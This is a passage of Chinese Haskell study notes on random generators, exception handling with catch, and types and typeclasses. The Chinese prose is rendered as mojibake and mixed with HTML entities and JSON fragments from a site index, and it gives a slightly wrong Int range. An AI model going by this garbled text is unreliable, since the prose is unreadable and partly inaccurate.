å…¶ä¸­åˆæœ‰ä¸¤ä¸ªæ–°çš„typeclassï¼ŒRandomè¡¨ç¤ºå¯ä»¥å–éšæœºï¼ŒRandomGenè¡¨ç¤ºéšæœºæ•°ç”Ÿæˆå™¨ã€‚randomå‡½æ•°æ¥æ”¶ä¸€ä¸ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œè¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ç”Ÿæˆçš„éšæœºæ•°ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªæ–°çš„éšæœºæ•°ç”Ÿæˆå™¨ è·å–éšæœºæ•°ç”Ÿæˆå™¨å¯ä»¥ä½¿ç”¨mkStdGenå‡½æ•°ï¼š mkStdGen :: Int -> StdGen å…¶ä¸­StdGenæ˜¯ä¸€ä¸ªRandomGençš„å®ä¾‹ è¿ç”¨randomç”Ÿæˆéšæœºæ•°éœ€è¦æŒ‡å®šç±»å‹ï¼Œä¸ç„¶ç¨‹åºæ— æ³•ç¡®å®šaæ˜¯ä»€ä¹ˆç±»å‹ã€‚ä¾‹å¦‚ï¼š 123456ghci&gt; random (mkStdGen 100) :: (Int, StdGen)(9216477508314497915,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})ghci&gt; random (mkStdGen 100) :: (Char, StdGen)('\\537310',StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})ghci&gt; random (mkStdGen 100) :: (Bool, StdGen)(True,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125}) å†æ¬¡è¿è¡ŒåŒæ ·çš„å‡½æ•°ï¼Œä¼šå¾—åˆ°åŒæ ·çš„ç»“æœã€‚æ‰€ä»¥å¦‚æœéœ€è¦ç”Ÿæˆå…¶ä»–çš„éšæœºæ•°ï¼Œéœ€è¦æ›´æ¢ç”Ÿæˆå™¨ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸Šä¸€æ¬¡è°ƒç”¨ç»“æœè¿”å›çš„æ–°éšæœºæ•°ç”Ÿæˆå™¨ï¼š 123456threeCoins :: StdGen -&gt; (Bool, Bool, Bool) threeCoins gen = let (firstCoin, newGen) = random gen (secondCoin, newGen') = random newGen (thirdCoin, newGen'') = random newGen' in (firstCoin, secondCoin, thirdCoin) randomsrandoms :: (Random a, RandomGen g) => g -> [a] randomsæ¥æ”¶ä¸€ä¸ªRandomGenï¼Œè¿”å›ä¸€ä¸ªéšæœºçš„æ— ç©·åˆ—è¡¨ã€‚å› ä¸ºå®ƒæ˜¯æ— ç©·çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¿”å›æ–°çš„éšæœºæ•°ç”Ÿæˆå™¨ randomRrandomR :: (Random a, RandomGen g) => (a, a) -> g -> (a, g) å¯ä»¥ç”¨æ¥ç”Ÿæˆæœ‰èŒƒå›´çš„éšæœºæ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨ç¤ºç”Ÿæˆéšæœºæ•°çš„èŒƒå›´(é—­åŒºé—´) randomRsrandomRs :: (Random a, RandomGen g) => (a, a) -> g -> [a] åŒä¸Šä¸¤ä¸ªï¼Œç”Ÿæˆæœ‰èŒƒå›´çš„æ— ç©·éšæœºæ•°åˆ—è¡¨ getStdGenå¦‚æœæƒ³è¦è®©ç¨‹åºæ¯æ¬¡è¿è¡Œå¾—åˆ°ä¸åŒçš„éšæœºç»“æœï¼Œéœ€è¦ä½¿ç”¨getStdGenæ¥è·å–å…¨å±€éšæœºæ•°ç”Ÿæˆå™¨ï¼Œå®ƒä¼šåœ¨æ¯æ¬¡è¿è¡Œçš„æ—¶å€™äº§ç”Ÿä¸åŒçš„å€¼ï¼Œä¹Ÿå› æ­¤ï¼Œå®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªI/O actionï¼Œè€Œä¸æ˜¯ä¸€ä¸ªç›´æ¥çš„StdGen getStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen å³å¯ä»¥çœ‹æˆgetStdGen :: IO StdGenï¼Œéœ€è¦ä½¿ç”¨&lt;-æ“ä½œç¬¦å°†StdGenæå–å‡ºæ¥ ä½†æ˜¯åœ¨åŒä¸€ä¸ªç¨‹åºä¸­ï¼ŒgetStdGençš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œå…¨å±€éšæœºæ•°ç”Ÿæˆå™¨ä¸ä¼šè‡ªåŠ¨æ›´æ–°ï¼Œæ‰€ä»¥å°±éœ€è¦å¦ä¸€ä¸ªå‡½æ•°newStdGen newStdGennewStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen æ‰§è¡ŒnewStdGenä¼šè¿›è¡Œä¸¤ä¸ªæ“ä½œï¼š æ›´æ–°å…¨å±€éšæœºæ•°ç”Ÿæˆå™¨ï¼Œä¸‹æ¬¡æ‰§è¡ŒgetStdGenä¼šè·å¾—ä¸åŒçš„ç»“æœ è¿”å›ä¸€ä¸ªI/O actionï¼ŒåŒ…å«ä¸€ä¸ªæ–°çš„StdGenï¼ˆä½†æ˜¯è¿™ä¸ªç”Ÿæˆå™¨å’Œå…¨å±€ç”Ÿæˆå™¨ä¹Ÿä¸åŒï¼‰ Exceptionsç¨‹åºåœ¨è¿è¡Œå¤±è´¥æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¯ä»¥é€šè¿‡Control.Exceptionæ¨¡å—ä¸­çš„catchå‡½æ•°æ¥æ•è·å¼‚å¸¸ï¼š catch :: Exception e => IO a -> (e -> IO a) -> IO a ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è¿›è¡Œçš„æ“ä½œï¼Œä»¥IO aä¸ºè¿”å›å€¼çš„ç±»å‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ¥æ”¶å¼‚å¸¸å¹¶è¿›è¡Œæ“ä½œï¼Œä¾‹å¦‚ï¼š 12345678910import Control.Exceptionmain = main' `catch` handlermain' :: IO ()main' = do ...handler :: Exception e =&gt; e -&gt; IO ()handler e = putStrLn &quot;...&quot; ä¹Ÿå¯ä»¥åˆ©ç”¨å®ˆå«ï¼ˆguardï¼‰è¯­æ³•å’ŒSystem.IO.Errorä¸­çš„å‡½æ•°æ¥åˆ¤æ–­IOå¼‚å¸¸çš„ç±»å‹æ¥è¿›è¡Œä¸åŒæ“ä½œï¼š 123456789101112131415import System.Environmentimport System.IO.Errorimport Control.Exception main = toTry `catch` handler toTry :: IO () toTry = do (fileName:_) &lt;- getArgs contents &lt;- readFile fileName putStrLn $ &quot;The file has &quot; ++ show (length (lines contents)) ++ &quot; lines!&quot; handler :: IOError -&gt; IO () handler e | isDoesNotExistError e = putStrLn &quot;The file doesn't exist!&quot; | otherwise = ioError e å…·ä½“ç›¸å…³å…¨éƒ¨å‡½æ•°è§æ–‡æ¡£ï¼šSystem.IO.Errorã€Control.Exception Reference Learn You a Haskell ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbsp;&thinsp;","link":"/p/a5bbe48a.html"},{"title":"ã€ŒLearn Haskellã€#3 ç±»å‹ä¸ç±»å‹ç±»","text":"&lt; #2 #4 &gt; TypesHaskellæœ‰ä¸€ä¸ªé™æ€ç±»å‹ç³»ç»Ÿï¼Œä»»ä½•å˜é‡ã€å‡½æ•°éƒ½ä¼šå…·æœ‰ç±»å‹ï¼Œå¹¶ä¸”æœ‰ç±»å‹åˆ¤æ–­åŠŸèƒ½ï¼Œæ²¡ç»™å‡ºçš„ç±»å‹ä¼šè‡ªåŠ¨è¯†åˆ«ã€‚Typeçš„é¦–å­—æ¯å…¨ä¸ºå¤§å†™ï¼Œå¸¸ç”¨çš„æœ‰ï¼š Intï¼šæ•´å‹ï¼Œæœ‰ä¸Šä¸‹ç•ŒèŒƒå›´ï¼Œ-2147483647ï½2147483648 Integerï¼šæ•´æ•°ï¼Œæ— ç•Œï¼Œä½†æ˜¯æ•ˆç‡æ¯”Intä½ Floatï¼šå•ç²¾åº¦æµ®ç‚¹å‹ Doubleï¼šåŒç²¾åº¦æµ®ç‚¹å‹ Boolï¼šå¸ƒå°”å€¼ Charï¼šå­—ç¬¦ Stringï¼šå­—ç¬¦ä¸²ï¼Œç­‰åŒäº[Char] Orderingï¼šå¤§å°å…³ç³»ï¼ŒåŒ…å«LTã€EQã€GTï¼Œä¸”å®ƒä»¬æœ‰å¤§å°å…³ç³» LT &lt; EQ &lt; GT åˆ—è¡¨çš„ç±»å‹æ˜¯ç”±å…¶ä¸­å…ƒç´ å†³å®šçš„ï¼Œå¹¶ä¸”åˆ—è¡¨ä¸­å…ƒç´ å¿…é¡»æ˜¯åŒä¸€ç±»å‹ï¼Œæ‰€ä»¥åˆ—è¡¨çš„ç±»å‹å°±æ˜¯å…¶å…ƒç´ ç±»å‹å¤–åŠ []ã€‚ å…ƒç»„çš„ç±»å‹ç”±å…¶ä¸­å„ä¸ªå…ƒç´ çš„ç±»å‹å…±åŒå†³å®šï¼Œå› ä¸ºå…ƒç»„ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ä¸åŒç±»å‹ã€‚å¦‚(â€œabcâ€, â€˜aâ€™, True)çš„ç±»å‹æ˜¯([Char], Char, Bool)ã€‚ Typeclassesç±»å‹ç±»ï¼ˆTypeclassï¼‰æ˜¯å®šä¹‰ä¸€ç³»åˆ—åŠŸèƒ½çš„æ¥å£ï¼Œå¦‚æœä¸€ä¸ªTypeå±äºä¸€ä¸ªTypeclassçš„æˆå‘˜ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥å®ç°è¿™ä¸ªç±»å‹ç±»æ‰€è§„å®šçš„åŠŸèƒ½ã€‚ä¸€ä¸ªTypeä¹Ÿå¯ä»¥å±äºå¤šä¸ªTypeclassTypeclassçš„é¦–å­—æ¯ä¹Ÿå…¨ä¸ºå¤§å†™ï¼Œå¸¸è§çš„æœ‰ï¼š Eqï¼šå¯åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ Ordï¼šå¯æ¯”è¾ƒå¤§å° Showï¼šå¯å±•ç¤ºæˆå­—ç¬¦ä¸² Readï¼šå¯ä»å­—ç¬¦ä¸²è½¬æ¢æˆç‰¹å®šç±»å‹ Enumï¼šå¯æšä¸¾ï¼ˆè¿ç»­ï¼‰ï¼Œå³å¯ä»¥ä½¿ç”¨predå’Œsuccå‡½æ•°å¾—åˆ°å‰é©±å’Œåç¼€ Bounded: æœ‰ä¸Šä¸‹ç•Œï¼Œå¦‚æœå…ƒç»„ä¸­æ‰€æœ‰å…ƒç´ éƒ½å±äºBoundedï¼Œé‚£è¿™ä¸ªå…ƒç»„çš„ç±»å‹ä¹Ÿå±äºBounded Integralï¼šæ˜¯æ•´æ•°ï¼ŒåŒ…æ‹¬Intå’ŒInteger RealFloatï¼š æ˜¯å®æµ®ç‚¹æ•°ï¼ŒåŒ…æ‹¬Floatå’ŒDouble RealFracï¼šæ˜¯å®åˆ†æ•°ï¼ŒåŒ…æ‹¬Floatã€Doubleå’ŒRatioï¼ˆåœ¨Data.Ratioæ¨¡å—ä¸­ï¼‰ Floatingï¼šæ˜¯æµ®ç‚¹æ•°ï¼ŒåŒ…æ‹¬Floatã€Doubleå’ŒComplexï¼ˆåœ¨Data.Complexæ¨¡å—ä¸­ï¼‰ Realï¼šæ˜¯å®æ•°ï¼ŒåŒ…æ‹¬Integralå’ŒRealFracçš„æˆå‘˜ Fractionalï¼šæ˜¯åˆ†æ•°ï¼ŒåŒ…æ‹¬RealFracå’ŒFloatingçš„æˆå‘˜ Numï¼šæ˜¯æ•°å­—ï¼ŒåŒ…æ‹¬ä¸Šè¿°æ‰€æœ‰æ•°å­—ç›¸å…³çš„ç±»å‹ Type variableså¦‚æœæŸ¥çœ‹ä¸€ä¸ªå‡½æ•°çš„ç±»å‹ï¼Œæ¯”å¦‚headï¼Œé‚£ä¹ˆå°†ä¼šè¿”å›ä»¥ä¸‹ç±»å‹ï¼š head :: [a] -> a å…¶ä¸­çš„aå°±æ˜¯ä¸€ä¸ªç±»å‹å˜é‡ï¼ˆtype variableï¼‰ï¼Œå®ƒåœ¨headä¸­å¯ä»¥å±äºä»»ä½•ç±»å‹ï¼Œåœ¨è¿™é‡Œåªæ˜¯è¡¨ç¤ºè¿”å›å€¼çš„ç±»å‹å’Œè¾“å…¥çš„åˆ—è¡¨ä¸­çš„å…ƒç´ çš„ç±»å‹ç›¸ä¸€è‡´ã€‚ åœ¨å‡½æ•°çš„ç±»å‹è¡¨è¾¾å¼å…¶å®å¯ä»¥çœ‹ä½œ$\\lambda$è¡¨è¾¾å¼ï¼Œå®ƒé€‚ç”¨äº$\\alpha$å˜æ¢ï¼ˆ$\\alpha$-conversionï¼‰ã€‚å³aåœ¨è¿™é‡Œå¯ä»¥æŒ‡Intã€Charç­‰ç±»å‹ï¼Œä¹Ÿå¯ä»¥æŒ‡[Char], (Int, Char), ç”šè‡³å‡½æ•°Int -&gt; Intç­‰ã€‚ åœ¨å¤§éƒ¨åˆ†å‡½æ•°çš„ç±»å‹ä¸­ï¼Œç±»å‹å˜é‡éœ€è¦ä¿è¯æ˜¯æŸä¸ªTypeclassçš„æˆå‘˜æ‰èƒ½å®Œæˆæ“ä½œã€‚æ¯”å¦‚(==)å‡½æ•°ï¼Œå®ƒéœ€è¦ä¼ å…¥çš„å‚æ•°æ˜¯å¯åˆ¤æ–­ç›¸ç­‰çš„ï¼Œå³æ˜¯Eqçš„æˆå‘˜ï¼Œé‚£ä¹ˆ(==)çš„ç±»å‹å°±æ˜¯ï¼š (==) :: (Eq a) => a -> a -> Bool å…¶ä¸­=&gt;å‰çš„éƒ¨åˆ†(Eq a)å°±æ˜¯ç±»çº¦æŸï¼ˆclass constraintï¼‰ï¼Œå®ƒè§„å®šäº†aæ˜¯Eqçš„æˆå‘˜ï¼Œæ‰€ä»¥(==)å‡½æ•°ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯aç±»å‹ï¼Œä¸”éƒ½æ˜¯Eqçš„æˆå‘˜ï¼Œä¿è¯äº†å®ƒä»¬ä¹‹é—´æ˜¯å¯ä»¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰çš„ã€‚ å®šä¹‰æ–°Typeå®šä¹‰ä¸€ä¸ªæ–°çš„Typeéœ€è¦ä½¿ç”¨dataå…³é”®å­—ï¼Œæ¯”å¦‚å®šä¹‰Booléœ€è¦ä½¿ç”¨ï¼š data Bool = False | True å…¶ä¸­=å·¦ä¾§çš„éƒ¨åˆ†å®šä¹‰äº†æ–°ç±»å‹çš„åç§°Boolï¼Œå³ä¾§çš„éƒ¨åˆ†å«åšå€¼æ„é€ å™¨ï¼ˆvalue constructorsï¼‰ï¼Œè¡¨ç¤ºäº†Boolç±»å‹çš„å€¼ä¸ºFalseæˆ–Trueã€‚å¹¶ä¸”åç§°å’Œå€¼æ„é€ å™¨çš„é¦–å­—æ¯éƒ½éœ€è¦å¤§å†™ã€‚ å¦å¤–ï¼Œå€¼æ„é€ å™¨ä¹Ÿæ˜¯å‡½æ•°ï¼Œå®ƒä»¬å¯ä»¥æœ‰å‚æ•°ï¼Œå«åšé¡¹ï¼ˆfieldï¼‰ã€‚æ¯”å¦‚ï¼š 1data Shape = Circle Float Float Float | Rectangle Float Float Float Float å®ƒå®šä¹‰äº†ä¸€ä¸ªæ–°Typeå«Shapeï¼Œå€¼æ„é€ å™¨æ˜¯Circleå’ŒRectangleï¼ŒCircleæ¥æ”¶ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯Floatç±»å‹ï¼ŒRectangleæ¥æ”¶å››ä¸ªFloatç±»å‹å‚æ•°ã€‚å¦‚æœæŸ¥çœ‹Circleçš„ç±»å‹ï¼Œå°†è¿”å›ï¼š Circle :: Float -> Float -> Float -> Shape å¦‚æœæƒ³è¦è®©å®ƒèƒ½ç»™ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œéœ€è¦è®©å®ƒå±äºShowç±»å‹ç±»ã€‚åœ¨ä»£ç ä¸­åªéœ€è¦åœ¨ç»“å°¾åŠ ä¸Šderiving (Show): 1data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving (Show) ç±»å‹çš„åç§°å’Œå€¼æ„é€ å™¨åç§°ä¹Ÿå¯ä»¥ç›¸åŒï¼Œæ¯”å¦‚ï¼š 1data Point = Point Float Float deriving (Show) å¯¼å‡ºTypeåœ¨æ–‡ä»¶ä¸­å®šä¹‰äº†æ–°çš„Typeä¹‹åï¼Œå¦‚æœåœ¨åˆ«çš„æ–‡ä»¶ä¸­å°†å…¶ä½œä¸ºæ¨¡å—å¯¼å…¥ï¼Œåˆ™éœ€è¦å…ˆå¯¼å‡ºã€‚æ¯”å¦‚æ–‡ä»¶Shapes.hsä¸­å®šä¹‰äº†Shapeå’ŒPointï¼Œä»¥åŠå…¶ä»–çš„ä¸€äº›å‡½æ•°ï¼Œé‚£ä¹ˆæ–‡ä»¶å¼€å¤´éœ€è¦å†™ï¼š 123456module Shapes( Shape(..), Point(..), functionA, functionB) where å…¶ä¸­çš„Shape(..)å¯¼å‡ºäº†Shapeç±»å‹å’Œå®ƒæ‰€æœ‰çš„å€¼æ„é€ å™¨ï¼Œ..ä»£è¡¨äº†å®ƒçš„æ‰€æœ‰å€¼æ„é€ å™¨ã€‚å› æ­¤ï¼ŒShape(..)ç›¸å½“äºShape (Circle, Rectangle)ã€‚ å¦‚æœä¸æƒ³è¦å¯¼å‡ºå€¼æ„é€ å™¨ï¼Œå³ä¸å…è®¸ä½¿ç”¨å€¼æ„é€ å™¨çš„æ–¹æ³•æ¥åˆ›å»ºShapeç±»å‹çš„å˜é‡ã€‚é‚£ä¹ˆéœ€è¦å°†Shape(..)æ›¿æ¢ä¸ºShapeï¼Œè¿™æ ·å°±åªå¯¼å‡ºäº†Shapeç±»å‹ï¼Œè€Œä¸å¯¼å‡ºå…¶å€¼æ„é€ å™¨ã€‚ Record Syntaxå¦‚æœæƒ³è¦æ–¹ä¾¿åœ°å–å‡ºç±»å‹å®ä¾‹ä¸­çš„å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨Recordè¯­æ³•ï¼Œå¦‚ï¼š 123data Point = Point { xcoord :: Float , ycoord :: Float } deriving (Show) åœ¨å€¼æ„é€ å™¨çš„å‚æ•°éƒ¨åˆ†å…ˆåŠ ä¸€ä¸ªå¤§æ‹¬å·ï¼Œç„¶åæŒ‡å®šå–å‡ºå€¼çš„å‡½æ•°åç§°ï¼ˆxcoord, ycoordï¼‰ï¼Œåé¢æŒ‡å®šç±»å‹ï¼ˆ:: Floatï¼‰ã€‚è¿™æ ·xcoordå’Œycoordå°±éƒ½æ˜¯ä¸€ä¸ªç±»å‹ä¸ºPoint -&gt; Floatçš„å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢æ–¹æ³•æ¥è®¿é—®å€¼ï¼š 12345ghci&gt; let point = Point 1.0 2.0ghci&gt; xcoord point1.0ghci&gt; ycoord point2.0 åŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡ä¸‹é¢æ–¹æ³•æ¥åˆ›å»ºè¿™ä¸ªpointï¼š 1point = Point {ycoord=2.0, xcoord=1.0} Type parameterså€¼æ„é€ å™¨å¯ä»¥æ¥æ”¶å‚æ•°ï¼Œç±»å‹ä¹Ÿå¯ä»¥æ¥æ”¶å‚æ•°ï¼Œè¿™æ ·å®ƒå°±æˆä¸ºäº†ç±»å‹æ„é€ å™¨ï¼ˆtype constructorsï¼‰ã€‚å¦‚Maybeçš„å®šä¹‰ï¼š data Maybe a = Nothing | Just a å®ƒçš„å€¼æ˜¯Nothingæ—¶ï¼Œç±»å‹ä¸ºMaybe aï¼Œæ˜¯å¤šæ€çš„ï¼ˆpolymorphicï¼‰ã€‚ä»–çš„å€¼ä¸æ˜¯Nothingæ—¶ï¼Œç±»å‹å–å†³äºå€¼Just aä¸­açš„ç±»å‹ï¼Œå¯ä»¥æ„é€ å‡ºMaybe Intã€Maybe [Char]ç­‰å¤šç§ç±»å‹ï¼š 1234Nothing :: Maybe aJust 1 :: Num a =&gt; Maybe aJust 'a' :: Maybe CharJust &quot;abc&quot; :: Maybe [Char] å¯ä»¥ç”¨è¿™ç§æ–¹æ³•æ”¹å†™Pointï¼š 123data Point x y = Point { xcoord :: x , ycoord :: y } deriving (Show) ä½†ä½¿ç”¨ç±»å‹å‚æ•°ï¼ˆtype parametersï¼‰å¹¶ä¸æ˜¯æ€»æ˜¯æ–¹ä¾¿ï¼Œæ¯”å¦‚åœ¨å£°æ˜å‡½æ•°ç±»å‹çš„æ—¶å€™ä¸èƒ½åªä½¿ç”¨Pointæ¥è¡¨ç¤ºPointç±»å‹ï¼Œè€Œæ˜¯å¿…é¡»å†™æˆPoint Float Floatã€‚ è€Œä¸”ä¸èƒ½åœ¨å®šä¹‰ç±»å‹æ„é€ å™¨æ—¶æ·»åŠ ç±»çº¦æŸï¼ˆclass constraintï¼‰ï¼Œä¸ç„¶åœ¨ä¹‹åå£°æ˜å‡½æ•°ç±»å‹çš„æ—¶å€™ä¹Ÿéƒ½éœ€è¦æ·»åŠ ç±»çº¦æŸï¼Œå¦‚ï¼š 12data (Ord k) =&gt; Map k v = ... toList :: (Ord k) =&gt; Map k a -&gt; [(k, a)] EitherEitheræ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œå®ƒæœ‰ä¸¤ä¸ªå€¼æ„é€ å™¨ï¼Œå®šä¹‰æ˜¯ï¼š 1data Either a b = Left a | Right b deriving (Eq, Ord, Read, Show) å¦‚æœä½¿ç”¨äº†Leftï¼Œé‚£å®ƒçš„açš„ç±»å‹å°±æ˜¯å…·ä½“çš„ï¼›å¦‚æœä½¿ç”¨äº†Rightï¼Œé‚£å®ƒçš„bçš„ç±»å‹å°±æ˜¯å…·ä½“çš„ï¼š 12345678ghci&gt; Right 20 Right 20 ghci&gt; Left &quot;w00t&quot; Left &quot;w00t&quot; ghci&gt; :t Right 'a' Right 'a' :: Either a Char ghci&gt; :t Left True Left True :: Either Bool b Eitherå¯ä»¥çœ‹ä½œMaybeçš„è¡¥å……ï¼Œæ¯”å¦‚Maybeåœ¨ä½¿ç”¨æ—¶ï¼Œå‡ºç°å¼‚å¸¸å¯ä»¥è¿”å›Nothingï¼Œä½†åªæ˜¯ä¸€ä¸ªNothingï¼Œä¸åŒ…å«ä»»ä½•ä¿¡æ¯ï¼›ä½†EitheråŒ…å«å·¦å€¼å’Œå³å€¼ï¼Œæ­£å¸¸ç»“æœè¿”å›å³å€¼ï¼Œè€Œå‡ºç°å¼‚å¸¸å°±å¯ä»¥è¿”å›åŒ…å«é”™è¯¯ä¿¡æ¯çš„å·¦å€¼ï¼Œæ¯”å¦‚å®‰å…¨é™¤æ³•ï¼š 12345678safeDiv :: Int -&gt; Int -&gt; Maybe IntsafeDiv _ 0 = NothingsafeDiv x y = Just (x `div` y)ghci&gt; safeDiv 4 2Just 2ghci&gt; safeDiv 1 0Nothing è€Œä½¿ç”¨Eitherï¼š 12345678safeDiv :: Int -&gt; Int -&gt; Either String IntsafeDiv _ 0 = Left &quot;Divided by zero&quot;safeDiv x y = Right (x `div` y)ghci&gt; safeDiv 4 2Right 2ghci&gt; safeDiv 1 0Left &quot;Divided by zero&quot; Derived instancesæƒ³è¦ä½¿ä¸€ä¸ªå®šä¹‰çš„ç±»æ»¡è¶³æŸäº›Typeclassçš„éœ€æ±‚ï¼Œéœ€è¦ä»å…¶æ´¾ç”Ÿï¼ˆderiveï¼‰ï¼Œæ¯”å¦‚ï¼š 12data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday deriving (Eq, Ord, Show, Read, Bounded, Enum) è¿™æ ·Dayç±»å‹çš„å€¼ï¼ˆMondayï½Sundayï¼‰ä¹‹é—´å°±å¯ä»¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ï¼ˆä»Eqæ´¾ç”Ÿï¼‰ï¼Œæ¯”è¾ƒå¤§å°ï¼ˆä»Ordæ´¾ç”Ÿï¼Œå·¦ä¾§ä¸ºå°ï¼Œå³ä¾§ä¸ºå¤§ï¼‰ï¼Œæ˜¾ç¤ºæˆå­—ç¬¦ä¸²ï¼ˆä»Showæ´¾ç”Ÿï¼‰ï¼Œä»å­—ç¬¦ä¸²ä¸­è¯»å–ï¼ˆä»Readæ´¾ç”Ÿï¼‰ï¼ŒåŒ…å«è¾¹ç•Œï¼ˆä»Boundedæ´¾ç”Ÿï¼‰ï¼Œå¯ä»¥æšä¸¾ï¼ˆä»Enumæ´¾ç”Ÿï¼ŒæŒ‰ç…§å€¼æ„é€ å™¨ä¸­çš„é¡ºåºä¾æ¬¡å‘å³ï¼‰ Type synonymsä¸ºäº†é˜…è¯»æ–¹ä¾¿ï¼Œä¹¦å†™ç®€ä¾¿ï¼Œå¯ä»¥ä½¿ç”¨typeå…³é”®å­—ä¸ºå·²æœ‰ç±»å‹åˆ›å»ºåˆ«åï¼ˆsynonymsï¼‰ã€‚æ¯”å¦‚Stringçš„å®šä¹‰ï¼š type String = [Char] åœ¨æ‰€æœ‰éœ€è¦ä½¿ç”¨å­—ç¬¦ä¸²ï¼ˆå³[Char]ï¼‰çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨Stringæ¥ä»£æ›¿ï¼Œå®ƒä»¬æ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œåªæ˜¯Stringæ›´ç®€ä¾¿æ˜“è¯»ã€‚åŒæ—¶ï¼Œç±»å‹åˆ«åä¹Ÿå¯ä»¥æ¥æ”¶ç±»å‹å‚æ•° newtype keywordé™¤äº†dataã€typeå…³é”®å­—ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç”¨newtypeå…³é”®å­—æ¥å®šä¹‰ä¸€ä¸ªæ–°çš„ç±»å‹ï¼Œæ¯”å¦‚Control.Applicativeæ¨¡å—ä¸­çš„ZipListï¼š 1newtype ZipList a = { getZipList :: [a] } ä¸åŒäºtypeï¼Œå®ƒä¸æ˜¯åˆ«åï¼Œå¯ä»¥ä½¿ç”¨recordè¯­æ³•æ¥ç›´æ¥å®šä¹‰å–å‡ºå€¼çš„å‡½æ•° ä¸åŒäºdataï¼Œå®ƒåªèƒ½æœ‰ä¸€ä¸ªå€¼æ„é€ å™¨ï¼Œä½†æ˜¯é€Ÿåº¦è¦æ¯”dataå¿«ï¼Œè€Œä¸”æ›´åŠ æ‡’æƒ° Recursive data structuresä¸€ä¸ªç±»å‹ä¹Ÿå¯ä»¥é€’å½’å®šä¹‰ï¼Œæ¯”å¦‚ä¸€é¢—äºŒå‰æ ‘ï¼š 1data Tree a = EmptyTree | Node a (Tree a) (Tree a) deriving (Show, Read, Eq) å®šä¹‰æ–°Typeclasså®šä¹‰ä¸€ä¸ªæ–°çš„Typeclasséœ€è¦ä½¿ç”¨classå…³é”®å­—ï¼Œä¾‹å¦‚å®šä¹‰Eqç±»å‹ç±»ï¼š 12345class Eq a where (==) :: a -&gt; a -&gt; Bool (/=) :: a -&gt; a -&gt; Bool x == y = not (x /= y) x /= y = not (x == y) å…¶ä¸­aæ˜¯ä¸€ä¸ªç±»å‹å˜é‡ï¼Œå‰ä¸¤è¡Œå£°æ˜äº†éœ€è¦å®ç°çš„å‡½æ•°çš„åå­—åŠå…¶ç±»å‹ï¼Œåä¸¤è¡Œè¡¨æ˜äº†éœ€è¦çš„å‡½æ•°ä¹‹é—´å¯ä»¥ç›¸äº’å®šä¹‰ï¼ˆä¸å¿…è¦ï¼‰ã€‚ åŒ…å«äº†åä¸¤è¡Œä¹‹åï¼Œåªå®šä¹‰(==)å‡½æ•°æˆ–è€…(/=)å‡½æ•°éƒ½å¯ä»¥å®Œæˆå…¨éƒ¨å®šä¹‰ï¼Œå®ƒä»¬ï¼ˆ(==) | (/=)ï¼‰æˆä¸ºè¿™ä¸ªç±»å‹ç±»çš„æœ€å°å®Œæ•´å®šä¹‰ï¼ˆminimal complete definitionï¼‰ æŸ¥çœ‹ä¸€ä¸ªç±»å‹ç±»çš„æˆå‘˜éœ€è¦å®ç°çš„å‡½æ•°å¯ä»¥åœ¨GHCiä¸­ä½¿ç”¨:infoï¼š ghci> :info Eq 